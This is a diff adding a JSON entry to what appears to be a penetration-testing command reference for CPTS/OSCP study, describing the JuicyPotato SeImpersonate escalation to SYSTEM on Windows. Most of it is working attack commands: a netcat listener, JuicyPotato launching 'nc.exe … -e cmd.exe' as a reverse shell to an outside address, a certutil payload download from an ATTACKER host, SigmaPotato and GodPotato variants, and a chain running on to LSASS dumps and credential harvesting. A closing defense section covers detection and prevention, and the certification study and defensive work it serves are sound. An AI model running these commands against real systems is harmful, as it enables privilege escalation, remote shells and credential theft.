@@ -1,0 +1,104 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "juicypotato",
+    "nc"
+  ],
+  "tags": [
+    "seimpersonate",
+    "potato",
+    "system"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Token Privileges",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Listener for the SYSTEM shell",
+      "command": "sudo nc -lnvp 8443"
+    },
+    {
+      "label": "Run JuicyPotato with a CLSID (-t *)",
+      "command": "xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t *"
+    }
+  ],
+  "notes": "=== SeImpersonate — JuicyPotato Attack Chain ===\nMost reliable Windows privesc when landing as a service account (IIS, MSSQL, Jenkins).\n\n=== ATTACK FLOW ===\n1. Confirm privilege: whoami /priv → SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege\n2. Check OS: JuicyPotato requires pre-Server 2019 / pre-Win10 1809\n   For newer: use PrintSpoofer or RoguePotato instead\n3. Transfer JuicyPotato.exe to target writable directory\n4. Stand up listener: nc -lvnp 4444\n5. Execute:\n   .\\JuicyPotato.exe -l 53375 -p C:\\Windows\\System32\\cmd.exe -a \"/c nc.exe <IP> 4444 -e cmd.exe\" -t *\n   -l = local COM port, -p = process to launch, -a = arguments, -t = use both token methods\n\n=== MSSQL ENTRY PATH ===\nCredentials from file share → mssqlclient.py with -windows-auth\nSQL> enable_xp_cmdshell\nxp_cmdshell \"whoami /priv\"   → confirms SeImpersonate enabled\nTransfer JuicyPotato via: xp_cmdshell \"certutil -urlcache -split -f http://ATTACKER/JP.exe C:\\Temp\\JP.exe\"\n\n=== TECHNICAL MECHANISM ===\nJuicyPotato spins up a COM server on a local port\nAbuses DCOM/NTLM reflection to coerce a SYSTEM-level connection\nCaptures the SYSTEM token when it authenticates\nUses CreateProcessWithTokenW (SeImpersonate) or CreateProcessAsUser (SeAssignPrimaryToken)\n\n=== CHAINING CONTEXT ===\nSQL RCE → xp_cmdshell → JuicyPotato → SYSTEM shell → LSASS dump → domain hashes\nWeb shell → IIS service account → JuicyPotato → SYSTEM → secretsdump\nJenkins agent → SYSTEM shell → credential harvest → lateral movement\n\n=== DECISION TREE ===\nSeImpersonatePrivilege present?\n  YES → OS < Server 2019 / Win10 1809? → JuicyPotato\n       → OS >= Server 2019 / Win10 1809? → PrintSpoofer\n  NO → Check SeAssignPrimaryTokenPrivilege → same tools, different API used",
+  "references": [
+    {
+      "title": "JuicyPotato (ohpe)",
+      "url": "https://github.com/ohpe/juicy-potato"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "seimpersonate-printspoofer",
+      "note": "Newer-OS alternative via the spooler pipe.",
+      "rel": "alternative"
+    },
+    {
+      "id": "winpe-user-group-enum",
+      "note": "Confirms SeImpersonate is held.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "seimpersonate-juicypotato",
+  "name": "SeImpersonate - JuicyPotato to SYSTEM",
+  "command": "JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe <lhost> <lport> -e cmd.exe\" -t *",
+  "description": "With SeImpersonatePrivilege, JuicyPotato abuses DCOM/BITS to capture a SYSTEM token and run a command. Works on older Windows (pre-2019); use PrintSpoofer/RoguePotato on newer builds.",
+  "opsec": "loud",
+  "mitre": [
+    "T1134.001"
+  ],
+  "exam": "exam-ok",
+  "variations": [
+    {
+      "command": ".\\SigmaPotato.exe --revshell <lhost> <lport>",
+      "caption": "SigmaPotato: modern SeImpersonate exploit, works on Server 2019/2022 and Win10/11",
+      "label": ".\\SigmaPotato.exe"
+    },
+    {
+      "command": ".\\SigmaPotato.exe \"<command>\"",
+      "caption": "SigmaPotato: run arbitrary command as SYSTEM",
+      "label": ".\\SigmaPotato.exe"
+    },
+    {
+      "command": ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
+      "caption": "GodPotato: alternative for latest Windows/Server (2019+)",
+      "label": ".\\GodPotato-NET4.exe"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Service accounts with SeImpersonatePrivilege (e.g., MSSQL running as NT SERVICE\\MSSQL$) can impersonate any user who authenticates to them. JuicyPotato abuses DCOM/RPC: it creates a local COM server, configures a CLSID that authenticates as SYSTEM, and forces the SYSTEM account to authenticate to the attacker's local named pipe. The resulting SYSTEM token is then used to spawn a new process as SYSTEM.",
+    "prerequisites": "SeImpersonatePrivilege in current token (common for IIS AppPool, MSSQL service accounts). JuicyPotato.exe binary. A suitable CLSID for the target OS version. Available local port (default 53375). Windows Server 2016 or below (JuicyPotato blocked on Server 2019+; use PrintSpoofer instead).",
+    "impact": "SYSTEM-level code execution from a service account shell, enabling full system compromise from a limited MSSQL or IIS service account foothold.",
+    "detection": "JuicyPotato.exe execution (known tool signature). DCOM activation on unexpected CLSID with local loopback. Named pipe creation by service account process. SYSTEM process spawned as child of MSSQL/IIS worker process.",
+    "artifacts": "Process: JuicyPotato.exe executed by service account | Sysmon Event 1: SYSTEM process with service account parent | Named pipe: created by service account process | Network: loopback DCOM traffic on port 53375",
+    "prevention": "Do not run MSSQL, IIS, or other services as accounts with SeImpersonatePrivilege unless required. Use dedicated low-privilege service accounts (GMSA). On Server 2019+, JuicyPotato is blocked by default. Apply Credential Guard and token filtering. Monitor for DCOM abuse.",
+    "misconfiguration": "MSSQL service running as NT AUTHORITY\\SYSTEM or a service account with SeImpersonatePrivilege on a Server 2016 or earlier host.",
+    "vulnerable_config": "# Service account has SeImpersonatePrivilege:\nwhoami /priv | findstr SeImpersonate\n# SeImpersonatePrivilege Enabled\n\n# JuicyPotato execution:\n.\\JuicyPotato.exe -l 53375 -p C:\\Windows\\system32\\cmd.exe -t * -c '{4991d34b-80a1-4291-83b6-3328366b9097}'\n# Returns SYSTEM shell",
+    "secure_config": "# Use GMSA for MSSQL:\nNew-ADServiceAccount -Name gMSA_MSSQL -DNSHostName dc01.inlanefreight.local\nInstall-ADServiceAccount gMSA_MSSQL\n\n# Remove SeImpersonatePrivilege from service accounts where possible:\n# GPO: User Rights Assignment > Impersonate a client after authentication\n# List only: NT SERVICE\\* accounts that require it\n\n# Upgrade to Server 2019+ (JuicyPotato blocked by default)",
+    "sources": [
+      "HTB M26",
+      "MITRE T1134.001",
+      "MITRE T1068"
+    ]
+  }
+}
